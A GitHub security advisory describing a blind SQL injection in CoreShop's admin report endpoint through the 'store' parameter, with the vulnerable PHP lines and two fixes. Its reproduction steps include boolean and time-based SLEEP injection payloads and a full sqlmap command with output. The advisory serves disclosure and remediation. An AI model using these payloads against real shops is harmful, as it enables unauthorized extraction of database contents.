# [M] CoreShop Vulnerable to SQL Injection via Admin Reports

## Summary
Severity: Medium
Advisory: GHSA-ch7p-mpv4-4vg4
CVE: CVE-2026-22242
CWE: CWE-564, CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-01-07
Source: https://github.com/advisories/GHSA-ch7p-mpv4-4vg4
Type: github-advisory

## Affected
- Packagist: `coreshop/core-shop` — affected >=0 <4.1.8

## Details
### Affected Version(s)

- CoreShop 4.1.2 Demo (tested) [Demo | CoreShop](https://docs.coreshop.com/CoreShop/Getting_Started/Demo/index.html)
- Earlier versions may also be affected if the same code path exists

### Summary

A blind SQL injection vulnerability exists in the application that allows an authenticated administrator-level user to extract database contents using boolean-based or time-based techniques.
The database account used by the application is read-only and non-DBA, limiting impact to confidential data disclosure only. No data modification or service disruption is possible.

### Details

The vulnerability occurs due to unsanitized user input being concatenated into a SQL query without proper parameterization.

An attacker with administrative access can manipulate the affected parameter to influence the backend SQL query logic. Although no direct query output is returned, boolean and time-based inference techniques allow an attacker to extract data from the database.


### Impact

**Vulnerability Type:** Blind SQL Injection

**Impact:** Confidentiality only

An attacker can:

- Enumerate database schema
- Extract all data accessible to the application’s database user

**CVSS v3.1 (Base Score: 4.9 – Medium)**

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
```

### Steps to Reproduce:

<img width="1010" height="372" alt="1" src="https://github.com/user-attachments/assets/312422c8-f3ea-4332-8c14-59aed737da6a" />

1. **Send a Normal Request:**
    - Request the report endpoint with a valid `store` value (e.g. `store=1`) and observe that data is returned.
    
<img width="1259" height="725" alt="2" src="https://github.com/user-attachments/assets/56f91c23-bae5-4edf-9c17-c776c323b3a8" />

2. **Inject a Boolean TRUE Condition:**
    - Modify the parameter to `store=1 AND 1=1`.
    - The response returns the same data as the normal request.
    
<img width="1269" height="725" alt="3" src="https://github.com/user-attachments/assets/c998065a-dc59-4fe5-8be9-d5ea82736ade" />

3. **Inject a Boolean FALSE Condition:**
    - Modify the parameter to `store=1 AND 2=1`.
    - The response returns an empty dataset.
    
<img width="1259" height="536" alt="4" src="https://github.com/user-attachments/assets/3be68566-f1f3-4a61-81d7-4f8b0b318bf7" />

4. **Confirm Injection Behavior:**
    - The difference between TRUE and FALSE conditions confirms that the `store` parameter directly affects SQL query logic, indicating a boolean-based blind SQL injection.
    
5. **Automated Confirmation Using sqlmap:**
    - The vulnerable request was tested using `sqlmap` with the `store` parameter.
    - sqlmap successfully confirmed the parameter as **boolean-based and time-based blind SQL injectable**.
    - The tool was able to fingerprint the backend environment, including:
        - Database Management System (DBMS)
        - Database hostname
        - PHP version
        - Available database names
    - This confirms that the injection is exploitable beyond simple logic manipulation and allows database-level information disclosure.

<img width="1115" height="628" alt="5" src="https://github.com/user-attachments/assets/5370f6d1-9915-4bea-ae83-b7a977b8eeff" />

```php
C:\sqlmap>python sqlmap.py -r test.txt --random-agent --batch --force-ssl --ignore-code=403,404 --no-cast --tamper=between,randomcase,space2comment --proxy http://127.0.0.1:8080 -p store
---
Parameter: store (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: report=products&_dc=1767718087622&from=1767200400&to=1798650000&store=1 AND 3500=3500&objectType=all&orderState=[]&page=1&start=0&limit=50

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: report=products&_dc=1767718087622&from=1767200400&to=1798650000&store=1 AND (SELECT 6265 FROM (SELECT(SLEEP(5)))KORX)&objectType=all&orderState=[]&page=1&start=0&limit=50
---
web application technology: PHP 8.3.16
back-end DBMS: MySQL >= 5.0.12
hostname: 'coreshop4-demo-php-6c6b7c446f-9qd8w'
available databases [3]:
[*] app
[*] information_schema
[*] performance_schema
```


### Solution

To mitigate the SQL injection risk, user input should not be directly concatenated into SQL queries. The `store` parameter is expected to represent a numeric store identifier and should therefore be handled safely.

Two possible remediation approaches are recommended:

1. **Strict Type Enforcement (Minimal Fix)**
    
    If the `store` parameter is intended to be numeric only, enforce integer casting when retrieving the value (e.g. `(int) $storeId`). This prevents injection by ensuring that only numeric values are used in the query.
    
2. **Prepared Statements (Best Practice)**
    
    Alternatively, and preferably, the `store` parameter should be passed using parameter binding, consistent with the handling of other query values in this method. Using prepared statements fully prevents SQL injection and aligns with Doctrine DBAL best practices.
    

Applying either approach would prevent attackers from injecting SQL logic through the `store` parameter.

### Parameter

1. /admin/coreshop/report/get-data?report=products&_dc=1767720897882&from=1767200400&to=1798650000&**store=1**&objectType=all&orderState=%5B%5D&page=1&start=0&limit=50

### Line of Code

CoreShop/src/CoreShop/Bundle/CoreBundle/Report/SalesReport.php

**Line 64 :**

```php
$storeId =$parameterBag->get('store',null);
```

The `store` parameter is retrieved directly from the HTTP request via `ParameterBag`. This value originates from user-controlled input and is not validated or type-cast at this point.

**Line 77 :**

```php
if (null ===$storeId) {
return [];
}
```

This check ensures the parameter is present, but does not enforce type safety or restrict the value to an expected format (e.g., integer).

**Line 81 :**

```php
$store =$this->storeRepository->find($storeId);
```

The user-supplied value is used to query the repository. While this lookup may fail for invalid values, it does not prevent the same value from later being used in a raw SQL context.

**Line 107 :**

```php
WHERE orders.store =$storeId
  AND orders.orderState ='$orderCompleteState'
  AND orders.orderDate > ?
  AND orders.orderDate < ?
  AND saleState='" . OrderSaleStates::STATE_ORDER . "'
```

At this point, the `$storeId` value is **directly concatenated into the SQL query string**. Unlike other parameters in the query (`orderDate`), this value is **not bound as a prepared statement parameter**.

### Example Fixed Code

### Option 1: Strict Type Enforcement (Minimal Fix)

If the `store` parameter is intended to be numeric only, enforce integer casting before using it in the query.

```php
$storeId = (int)$parameterBag->get('store',0);

if ($storeId <=0) {
return [];
}

$sqlQuery = "
    SELECT DATE(FROM_UNIXTIME(orderDate)) AS dayDate, orderDate, SUM(totalGross) AS total
    FROM object_query_$classId AS orders
    WHERE orders.store =$storeId
      AND orders.orderState = '$orderCompleteState'
      AND orders.orderDate > ?
      AND orders.orderDate < ?
      AND saleState = '" .OrderSaleStates::STATE_ORDER . "'
    GROUP BY " .$groupSelector;
```

This ensures that only numeric values are used and prevents SQL logic injection.


### Option 2: Prepared Statements (Recommended Fix)

Use parameter binding for **all user-influenced values**, including `store`.

```php
$sqlQuery = "
    SELECT DATE(FROM_UNIXTIME(orderDate)) AS dayDate, orderDate, SUM(totalGross) AS total
    FROM object_query_$classId AS orders
    WHERE orders.store = ?
      AND orders.orderState = ?
      AND orders.orderDate > ?
      AND orders.orderDate < ?
      AND saleState = ?
    GROUP BY " .$groupSelector;

$results =$this->db->fetchAllAssociative(
$sqlQuery,
    [
        (int)$storeId,
$orderCompleteState,
$from->getTimestamp(),
$to->getTimestamp(),
OrderSaleStates::STATE_ORDER,
    ]
);
```

This approach fully eliminates SQL injection risks and aligns with Doctrine DBAL best practices.

## References
- https://github.com/coreshop/CoreShop/security/advisories/GHSA-ch7p-mpv4-4vg4
- https://nvd.nist.gov/vuln/detail/CVE-2026-22242
- https://github.com/coreshop/CoreShop/commit/59e84fec59d113952b6d28a9b30c6317f9e6e5dd
- https://github.com/coreshop/CoreShop
